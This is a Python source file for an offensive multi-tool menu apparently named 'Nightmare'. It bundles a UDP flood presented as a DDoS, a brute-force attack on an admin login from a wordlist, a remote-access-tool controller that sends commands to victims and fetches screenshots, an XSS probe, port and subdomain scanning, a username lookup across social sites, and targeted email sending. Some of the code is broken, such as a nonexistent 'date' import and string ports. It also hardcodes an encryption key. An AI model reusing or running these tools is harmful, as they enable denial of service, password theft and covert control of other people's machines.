import socket
import sys
from datetime import datetime
from threading import Thread

import smtplib
from email.mime.text import MIMEText
import requests
import turtle
import time
import random
import concurrent.futures
import date
from threading import Thread
from cryptography.fernet import Fernet
import cv2 # For video recording.
import signal # For handling the ctrl+c command when exiting the program.
# For running the video recording in a seperate thread. 
import numpy as np 
#from chatroom import key
#from chatroom import key



def messagerie():
    SERVER_HOST = input("enter the ip of the server crypted")
    SERVER_PORT = input("enter the port of the server crypted")
    
    client = socket.socket()
    print(f"[*] Connecting to {SERVER_HOST}:{SERVER_PORT}...")
    client.connect((SERVER_HOST, SERVER_PORT))
    print("[+] Connected.")
    
    key = "D8ZQNJVIyzpo74D-eGEVxHzFv9ZnU57UBM_eaERtE4U=".encode()
    f_key = Fernet(key)
    
    name = input("Enter a username: ")
    
    def listen():
        
        while True:
            message = client.recv(10240)
            decrypted_message = f_key.decrypt(message)
            
            print("\n" + decrypted_message.decode())
    
    if __name__ == "__main__":
    
        try:
            thread = Thread(target=listen)
            thread.daemon = True
            thread.start()
    
            while True:
                message = input("enter a message > ")
    
                if message.lower() == "q":
                    break
    
                message = f"[{str(datetime.now())}] {name}: {message}"
                message = message.encode()
    
                encrypted_message = f_key.encrypt(message)
                client.send(encrypted_message)
    
            client.close()
    
        except KeyboardInterrupt:
    
            client.close()
            sys.exit()




def rat_functionality():
    """Fonctionnalité R.A.T (Remote Access Tool)"""
    port = input(" enter the port for the rat : ")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = ""
    s.bind((host, port))
    s.listen(1)
    conn, address = s.accept()
    print("Connecté à : {}".format(address))

    while True:
        message = input("cmd > ")
        if message == "":
            print("Entrez une commande...")
        elif message == "screenshot":
            conn.send(message.encode("utf-8"))
            with open("screen.png", "wb") as img:
                len_img = int(conn.recv(1024).decode())
                dl_data = 0
                while dl_data < len_img:
                    rec = conn.recv(1024)
                    img.write(rec)
                    dl_data += len(rec)
        else:
            conn.send(message.encode("utf-8"))
            data = conn.recv(1024)
            if data.decode("utf-8") == "close":
                conn.close()
                break
            print(data.decode("utf-8"))




def ddos_attack(ip, port):
    """Effectue une attaque DDoS sur l'IP et le port spécifiés."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    sent = 0
    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1
            port += 1
            print(f"Envoyé {sent} paquet à {ip} à travers le port : {port}")
            if port == 65534:
                port = 1
    except KeyboardInterrupt:
        print("\n[-] Ctrl+C détecté.........Sortie")
        print("[-] ATTAQUE DDoS ARRÊTÉE")





WEBSITES = {
    "Instagram": "https://www.instagram.com/{}",
    "Facebook": "https://www.facebook.com/{}",
    "YouTube": "https://www.youtube.com/user/{}",
    "Reddit": "https://www.reddit.com/user/{}",
    "GitHub": "https://github.com/{}",
    "Twitch": "https://www.twitch.tv/{}",
    "Pinterest": "https://www.pinterest.com/{}/",
    "TikTok": "https://www.tiktok.com/@{}",
    "Flickr": "https://www.flickr.com/photos/{}"
}

REQUEST_DELAY = 2
MAX_RETRIES = 3
last_request_times = {}

def check_username(website, username):
    url = website.format(username)
    for _ in range(MAX_RETRIES):
        try:
            current_time = time.time()
            if website in last_request_times and current_time - last_request_times[website] < REQUEST_DELAY:
                time.sleep(REQUEST_DELAY - (current_time - last_request_times[website]))

            response = requests.get(url)
            last_request_times[website] = time.time()

            return url if response.status_code == 200 else False
        except requests.exceptions.RequestException:
            time.sleep(random.uniform(1, 3))
    return False




def detect_subdomains(domain, subdomains):
    """Détecte les sous-domaines d'un domaine donné."""
    found = []
    for sub in subdomains:
        url = f"http://{sub}.{domain}"
        try:
            requests.get(url)
            found.append(url)
        except requests.ConnectionError:
            pass
    return found



def test_xss(url):
    """Teste la vulnérabilité XSS sur l'URL spécifiée."""
    payload = "<script>alert('XSS')</script>"
    response = requests.get(url + "?search=" + payload)
    if payload in response.text:
        print("Vulnérabilité XSS trouvée!")
    else:
        print("Pas de vulnérabilité XSS.")




def scanner_ports(ip, ports):
    """Scanne les ports spécifiés sur l'adresse IP donnée."""
    for port in ports:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            if result == 0:
                print(f"[+] Port {port} est ouvert")
            else:
                print(f"[-] Port {port} est fermé")





def attaque_dictionnaire(url, fichier_dico):
    """Effectue une attaque par dictionnaire sur l'URL spécifiée."""
    with open(fichier_dico, 'r') as f:
        for ligne in f:
            mot_de_passe = ligne.strip()
            response = requests.post(url, data={'username': 'admin', 'password': mot_de_passe})
            if "Connexion réussie" in response.text:
                print(f"Mot de passe trouvé : {mot_de_passe}")
                return
    print("Aucun mot de passe trouvé dans le dictionnaire.")







def send_email(to_email, subject, body):
    """Envoie un email avec le sujet et le corps spécifiés."""
    try:
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = 'oxynatore.78@gmail.com'
        msg['To'] = to_email

        with smtplib.SMTP('smtp.example.com') as server:
            server.login('user', 'password')
            server.sendmail(msg['From'], [msg['To']], msg.as_string())
            print("Email envoyé avec succès")
    except Exception as e:
        print(f"Erreur lors de l'envoi de l'email : {e}")







def draw_spiral():
    """Dessine une spirale à l'aide de la bibliothèque turtle."""
    screen = turtle.Screen()
    screen.bgcolor('black')

    t = turtle.Turtle()
    t.speed('fastest')

    for x in range(200):
        t.pencolor('red')
        t.width(x / 100 + 1)
        t.forward(x)
        t.left(79)

    time.sleep(5)
    turtle.bye()



draw_spiral()
print(" _   _ _       _     _                             ")                          
print("| \ | (_)     | |   | |                            ")                          
print("|  \| |_  __ _| |__ | |_ _ __ ___   __ _ _ __ ___  ")  
print("| . ` | |/ _` | '_ \| __| '_ ` _ \ / _` | '__/ _ \ ")  
print("| |\  | | (_| | | | | |_| | | | | | (_| | | |  __/ ")  
print("\_| \_/_|\__, |_| |_|\__|_| |_| |_|\__,_|_|  \___| ")  
print("          __/ |                        by CK 19    ")                              
print("         |___/                           v1.1.1\n\n")                                





print("            Welcome to X_On         ")
print("    *********************************")
print("    * -1 mail auto                  *")
print("    * -2 dictionary attack          *")
print("    * -3 port scanner               *")
print("    * -4 xss search                 *")
print("    * -5 sub domain                 *")
print("    * -6 individual search          *")
print("    * -7 ddos                       *")
print("    * -8 R.A.T                      *")
print("    * -9 encrypted messaging        *")
print("    *********************************\n")


choice = input("     [+] Give an answer to Nightmare : ")
if choice == '1':

    mail = input("\n Give the mail of the target : ")
    title = input("Give the title of the mail : ")
    message = input("Give your message : ")
    send_email(mail, title, message)
elif choice == '2':
    url_login = input("Entrez l'URL de connexion : ")
    fichier_dictionnaire = input("Entrez le nom du fichier dictionnaire : ")
    attaque_dictionnaire(url_login, fichier_dictionnaire)

elif choice == '3':
    ip_serveur = input("Entrez l'adresse IP à scanner : ")
    ports_a_scanner = list(map(int, input("Entrez les ports à scanner (séparés par des virgules) : ").split(',')))
    scanner_ports(ip_serveur, ports_a_scanner)

elif choice == '4':
    target_url = input("Entrez l'URL cible : ")
    test_xss(target_url)
    
elif choice == '5':
    domain = input("Entrez le domaine (ex: exemple.com) : ")
    subdomains = input("Entrez les sous-domaines à tester (séparés par des virgules) : ").split(',')
    found_subdomains = detect_subdomains(domain, subdomains)
    print("Sous-domaines trouvés :", found_subdomains)
    
elif choice == '6':
    username = input("Entrez le nom d'utilisateur à vérifier : ")
    results = {}
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = {executor.submit(check_username, website, username): name for name, website in WEBSITES.items()}
        for future in concurrent.futures.as_completed(futures):
            results[futures[future]] = future.result() or False
        for website, result in results.items():
            print(f"{website}: {'Trouvé' if result else 'Non trouvé'} ({result if result else ''})")

elif choice == '7':
    ip = input("Entrez l'adresse IP cible : ")
    port = int(input("Entrez le port cible : "))
    ddos_attack(ip, port)
    
elif choice == '8':
    rat_functionality()
    
    
elif choice == '9':
        # Code à exécuter si le choix est 9
        print("Exécution du code pour le choix 9...")
        messagerie()
        # Ajoutez ici le code que vous souhaitez exécuter pour le choix 9
